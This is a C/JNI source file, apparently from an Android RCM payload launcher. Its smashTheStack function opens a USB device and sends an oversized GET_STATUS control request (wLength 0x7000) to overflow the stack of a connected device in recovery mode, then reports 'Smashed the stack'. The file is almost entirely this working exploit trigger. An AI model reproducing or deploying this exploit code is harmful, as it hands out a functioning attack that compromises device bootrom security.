#include "native.h"

struct usbdevfs_urb urb;

JavaVM* jvm;

void setStaticJVM(JNIEnv* env) {
	(*env).GetJavaVM(&jvm);
}

void callStaticVoidWithStringArg(jclass cl, const char* name, const char* signature, const char* string) {
	JNIEnv* env;
	(*jvm).AttachCurrentThread((void**) &env, NULL);
	jmethodID id = (*env).GetStaticMethodID(cl, name, signature);
	jstring value = (*env).NewStringUTF(string);
	(*env).CallStaticVoidMethod(cl, id, value);
}

void appendLog(const char* line) {
	JNIEnv* env;
	(*jvm).AttachCurrentThread((void**) &env, NULL);
	jclass c = (*env).FindClass("rcm/RCM");

	callStaticVoidWithStringArg(c, "appendLog", "(Ljava/lang/String;)V", line);
}

void setRCMStatus(const char* status) {
	JNIEnv* env;
	(*jvm).AttachCurrentThread((void**) &env, NULL);
	jclass c = (*env).FindClass("rcm/RCM");

	callStaticVoidWithStringArg(c, "setRCMStatus", "(Ljava/lang/String;)V", status);
}

JNIEXPORT jboolean JNICALL Java_rcm_RCM_smashTheStack(JNIEnv* env, jclass cl, jint bus_id, jint device_address) {
	setStaticJVM(env);
	int return_value;

    	char* usb_path = (char*) malloc(24 * sizeof(char));

    	sprintf(usb_path, "/dev/bus/usb/%03d/%03d", bus_id, device_address);
    	int fd = open(usb_path, O_RDWR);
    	
    	if (fd == -1) {
    		setRCMStatus("ERROR");
    		appendLog("Failed to open device\nFailed to smash the stack");
        	return false;
        }
    
    	struct usb_ctrlrequest* ctrl_request;

    	__u8* buffer[0x7000 + sizeof(ctrl_request)];
    
    	ctrl_request = (struct usb_ctrlrequest *) buffer;
        ctrl_request->bRequestType = 0x82;
        ctrl_request->bRequest = USB_REQ_GET_STATUS;
        ctrl_request->wValue = 0;
        ctrl_request->wIndex = 0;
        ctrl_request->wLength = 0x7000;

    	memset(&urb, 0, sizeof(urb));
        urb.type = USBDEVFS_URB_TYPE_CONTROL;
     	urb.endpoint = USB_DIR_IN | 0;
     	urb.buffer = buffer;
     	urb.buffer_length = sizeof(buffer);
     	
    	return_value = ioctl(fd, USBDEVFS_SUBMITURB, &urb);
    	
    	if (return_value != 0) {
        	setRCMStatus("ERROR");
        	appendLog("Ioctl failed\nFailed to smash the stack");
        	return false;
        }
        
    	usleep(250000);
    	struct usbdevfs_urb urb1;
    	return_value = ioctl(fd, USBDEVFS_REAPURBNDELAY, &urb1);
    	
    	if (return_value < 0) {
        	if (errno == EAGAIN) {
            		return_value = ioctl(fd, USBDEVFS_DISCARDURB, &urb);
            		usleep(40000);
            		return_value = ioctl(fd, USBDEVFS_REAPURBNDELAY, &urb1);
        	}
    	}
    	
    	free(usb_path);   
    	close(fd);
    	setRCMStatus("RCM_LOADED");
    	appendLog("Smashed the stack");
    	return true;
}
